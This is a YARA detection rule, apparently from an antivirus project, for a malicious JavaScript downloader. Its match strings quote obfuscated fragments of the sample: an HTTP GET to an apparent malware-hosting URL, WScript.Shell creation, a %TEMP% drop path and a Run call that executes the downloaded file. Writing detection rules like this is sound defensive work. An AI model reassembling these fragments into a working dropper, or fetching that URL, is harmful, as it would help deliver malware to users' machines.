rule sig_20160427_8cc7216da8ffd1c699c7a3d953de9d06 {
  meta:
    description = "datamaliciousorder - file 20160427_8cc7216da8ffd1c699c7a3d953de9d06.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "684d82f2d03b11467ba60d075a0065804ce05b613017aa7ea3cac80c5fbacbe7"

  strings:
    $s1  = "XuacjPllvx[NzmgvJeilc](\"G\" + \"ET\", \"http://totaltransport.com.br/n7dus\", false);" fullword ascii
    $s2  = "var FzammKjgni = function OlirjKlvav() {return TvhbhLluxq[ZgnrbRvjfp](\"WScript\"+\".Shell\");}(), VvlrlSfsif = 11;" fullword ascii
    $s3  = "function OuqxxYwqry(KjuwkHmmie, BjiymNywgs){KoyufLhspg = KoyufLhspg * 1; return KjuwkHmmie - BjiymNywgs;};" fullword ascii
    $s4  = "var TvhbhLluxq = this[\"WScript\"];" fullword ascii
    $s5  = "function PphocLrsyl() {return FzammKjgni[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ORnXJmL" ascii
    $s6  = "function PphocLrsyl() {return FzammKjgni[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ORnXJmL" ascii
    $s7  = "function UbfbuNjhmq(){return GoiznEdalq + \"\";};" fullword ascii
    $s8  = "if (XuacjPllvx[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function BhjxgLlpsi() {return ((VaiscEboyn == true) && (VaiscEboyn == IxvinCyjiq)) ? 1 : KoyufLhspg;};" fullword ascii
    $s10 = "VpfmgXqrph = true;" fullword ascii
    $s11 = "function NgaajOdgnc(){return ZgnrbRvjfp;};" fullword ascii
    $s12 = "var PncphHszdv = new this[\"D\"+\"ate\"]();" fullword ascii
    $s13 = "IxvinCyjiq = true; " fullword ascii
    $s14 = "return OuqxxYwqry(BbviwFsrru, CesinSrpfm);" fullword ascii
    $s15 = "var VpfmgXqrph = false;" fullword ascii
    $s16 = "function IifceNpasw(LihmlJijqv){FzammKjgni[\"R\"+\"un\"](LihmlJijqv, KoyufLhspg, KoyufLhspg);};" fullword ascii
    $s17 = "}while (TuhnxIzaej);" fullword ascii
    $s18 = "var VaiscEboyn = false;" fullword ascii
    $s19 = "var IxvinCyjiq = false;" fullword ascii
    $s20 = "function UwpwuOmrux(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}